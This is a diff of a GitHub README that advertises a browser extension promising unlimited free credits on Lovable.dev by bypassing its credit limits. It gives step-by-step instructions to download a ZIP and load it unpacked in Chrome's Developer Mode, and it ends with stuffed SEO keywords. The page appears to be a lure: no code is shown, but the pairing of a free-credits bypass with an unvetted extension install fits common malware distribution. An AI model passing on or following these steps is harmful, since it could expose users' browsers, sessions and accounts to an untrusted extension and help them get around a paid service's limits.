@@ -14,11 +14,19 @@ This tool acts as a **Lovable credit helper**, allowing developers to build mass
 When building web apps using Lovable AI, credits run out fast. This open-source extension modifies the frontend and request patterns to ensure you get the most out of every single credit, making it the best **Lovable credits bypass alternative** available on GitHub.
 
 ## 🛠️ How to Install (Step-by-Step)
-1. **Download** this repo: `https://github.com/BINOD-XD/Lovable-Unlimited-Free-Credits/raw/refs/heads/main/elitebytes-extension.zip`
-2. Open your browser and navigate to `chrome://extensions/`.
-3. Enable **Developer Mode** (Top-right corner).
-4. Click **Load Unpacked** and select this repository folder.
-5. Open **Lovable.dev** and enjoy optimized credits!
+
+1. **Download the Extension:**
+   Click the button below to download the latest extension files directly:
+   
+   <a href="https://github.com/BINOD-XD/Lovable-Unlimited-Free-Credits/raw/refs/heads/main/elitebytes-extension.zip" target="_blank">
+     <img src="https://img.shields.io/badge/Download-Extension%20ZIP-blue?style=for-the-badge&logo=github&logoColor=white" alt="Download Extension" height="40">
+   </a>
+
+2. **Extract the ZIP file** on your computer.
+3. Open your browser and navigate to `chrome://extensions/`.
+4. Enable **Developer Mode** (Top-right corner).
+5. Click **Load Unpacked** and select the extracted folder.
+6. Open **Lovable.dev** and enjoy optimized credits!
 
 ## 🏷️ Keywords & Tags
 Lovable AI, Lovable.dev Free Credits, Lovable Credit Bypass, Lovable Unlimited Credits, Lovable Extension, Lovable Automation Tool, Free AI Web Development.
